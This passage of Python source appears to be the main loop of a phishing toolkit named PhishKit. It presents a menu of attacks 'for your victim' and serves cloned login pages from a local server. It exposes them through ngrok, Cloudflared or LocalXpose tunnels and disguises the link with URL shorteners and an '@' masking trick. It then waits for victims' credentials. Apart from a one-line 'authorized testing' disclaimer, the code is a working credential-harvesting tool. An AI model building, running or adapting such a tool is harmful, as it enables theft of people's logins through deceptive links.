    """Try to shorten URL using is.gd"""
    try:
        resp = urllib.request.urlopen(f"https://is.gd/create.php?format=simple&url={urllib.parse.quote(url)}")
        return resp.read().decode().strip()
    except:
        try:
            resp = urllib.request.urlopen(f"https://tinyurl.com/api-create.php?url={urllib.parse.quote(url)}")
            return resp.read().decode().strip()
        except:
            return url

# ========== MAIN ==========
def main():
    """Main application entry point"""
    httpd = None
    thread = None
    current_port = PORT
    
    # Create directories
    mkdir_p(BASE_DIR / ".server" / "www")
    mkdir_p(BASE_DIR / "auth")
    mkdir_p(BASE_DIR / ".sites")
    
    # Signal handling
    running = True
    def cleanup(sig=None, frame=None):
        nonlocal running
        running = False
        if httpd:
            httpd.shutdown()
        print(f"\n{C.R}[!] Program terminated.{C.W}")
        sys.exit(0)
    
    import signal
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)
    
    while running:
        clear()
        banner()
        
        # Display menu
        print(f"\n{C.R}[{C.W}::{C.R}]{C.O} Select An Attack For Your Victim {C.R}[{C.W}::{C.R}]{C.O}")
        print()
        
        # Print in columns
        items = list(TEMPLATES.items())
        cols = 3
        for i in range(0, len(items), cols):
            row = items[i:i+cols]
            line = ""
            for key, val in row:
                line += f"{C.R}[{C.W}{key}{C.R}]{C.O} {val['name']:<14}"
            print(f"  {line}")
        
        print(f"\n  {C.R}[{C.W}99{C.R}]{C.O} About          {C.R}[{C.W}00{C.R}]{C.O} Exit")
        print()
        
        try:
            choice = input(f"{C.R}[{C.W}-{C.R}]{C.G} Select an option : {C.B}").strip()
        except (EOFError, KeyboardInterrupt):
            cleanup()
            return
        
        if choice == "00":
            clear()
            banner()
            print(f"\n{C.Gb}{C.K} Thank you for using PhishKit. Have a good day.{C.RS}")
            break
        
        if choice == "99":
            clear()
            banner()
            print(f"\n{C.G} Author   {C.R}:  {C.O}Security Research Team")
            print(f"{C.G} Version  {C.R}:  {C.O}{VERSION}")
            print(f"\n{C.W} {C.Rb}Warning:{C.RS}")
            print(f"{C.C}  This tool is made for authorized security testing")
            print(f"  and educational purposes only.{C.W}")
            print(f"\n{C.R}[{C.W}00{C.R}]{C.O} Main Menu     {C.R}[{C.W}99{C.R}]{C.O} Exit")
            inp = input(f"\n{C.R}[{C.W}-{C.R}]{C.G} Select option : {C.B}")
            if inp == "99":
                cleanup()
            continue
        
        if choice not in TEMPLATES:
            print(f"\n{C.R}[!] Invalid option.{C.W}")
            time.sleep(1)
            continue
        
        site = TEMPLATES[choice]
        site_key = site["key"]
        site_name = site["name"]
        mask_url = site["mask"]
        
        # Get template HTML
        phish_html = SITES.get(site_key, {}).get("html")
        if not phish_html:
            phish_html = gen_html(site_name)
        
        # Port selection
        clear()
        banner_small()
        print()
        p_ans = input(f"{C.R}[{C.W}?{C.R}]{C.O} Do You Want A Custom Port {C.G}[{C.C}y{C.G}/{C.C}N{C.G}]: {C.O}").strip().lower()
        if p_ans == 'y':
            try:
                cu_p = int(input(f"\n{C.R}[{C.W}-{C.R}]{C.O} Enter custom 4-digit port [1024-9999]: {C.W}").strip())
                if 1024 <= cu_p <= 9999:
                    current_port = cu_p
                else:
                    print(f"\n{C.R}[!] Invalid port, using default.{C.W}")
                    current_port = PORT
            except:
                current_port = PORT
        else:
            current_port = PORT
        
        # Tunnel selection
        clear()
        banner_small()
        print(f"\n{C.R}[{C.W}01{C.R}]{C.O} Localhost")
        print(f"{C.R}[{C.W}02{C.R}]{C.O} Ngrok.io")
        print(f"{C.R}[{C.W}03{C.R}]{C.O} Cloudflared")
        print(f"{C.R}[{C.W}04{C.R}]{C.O} LocalXpose")
        print()
        tun_choice = input(f"{C.R}[{C.W}-{C.R}]{C.G} Select tunnel service : {C.B}").strip()
        
        # Start HTTP server
        print(f"\n{C.R}[{C.W}-{C.R}]{C.B} Setting up server...{C.W}")
        
        httpd = HTTPServer((HOST, current_port), PhishHandler)
        httpd.phish_html = phish_html
        httpd.site_name = site_name
        httpd.redirect_url = "https://www.google.com"
        
        thread = threading.Thread(target=httpd.serve_forever)
        thread.daemon = True
        thread.start()
        
        print(f"{C.R}[{C.W}-{C.R}]{C.B} Starting server on {C.C}http://{HOST}:{current_port}{C.W}")
        
        tunnel_url = None
        
        if tun_choice in ("1", "01"):
            tunnel_url = f"http://{HOST}:{current_port}"
            print(f"{C.G}  Local URL: {C.C}{tunnel_url}{C.W}")
            print(f"{C.O}  Warning: Only accessible from this machine.{C.W}")
        
        elif tun_choice in ("2", "02"):
            tunnel_url = start_ngrok(current_port)
        
        elif tun_choice in ("3", "03"):
            print(f"{C.O}  Cloudflared: Install cloudflared and run:")
            print(f"    cloudflared tunnel --url http://{HOST}:{current_port}{C.W}")
            tunnel_url = f"http://{HOST}:{current_port}"
        
        elif tun_choice in ("4", "04"):
            print(f"{C.O}  LocalXpose: Install localxpose and run:")
            print(f"    loclx tunnel --raw-mode http --https-redirect -t {HOST}:{current_port}{C.W}")
            tunnel_url = f"http://{HOST}:{current_port}"
        
        # Show URLs
        if tunnel_url:
            short = shorten_url(tunnel_url)
            masked = f"{mask_url}@{short.replace('https://','')}" if short else tunnel_url
            
            print(f"\n{C.R}[{C.W}-{C.R}]{C.B} URL 1 : {C.G}{tunnel_url}")
            print(f"{C.R}[{C.W}-{C.R}]{C.B} URL 2 : {C.O}{short}")
            print(f"{C.R}[{C.W}-{C.R}]{C.B} URL 3 : {C.O}{masked}")
        
        print(f"\n{C.R}[{C.W}-{C.R}]{C.O} Waiting for login info, {C.B}Ctrl + C {C.O}to exit...{C.W}")
        
        # Monitor for credentials
        try:
            while running:
                time.sleep(1)
        except KeyboardInterrupt:
            if httpd:
                httpd.shutdown()
            print(f"\n{C.R}[!] Returning to menu.{C.W}")
            time.sleep(1)
            continue

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.R}[!] Exiting.{C.W}")
        sys.exit(0)
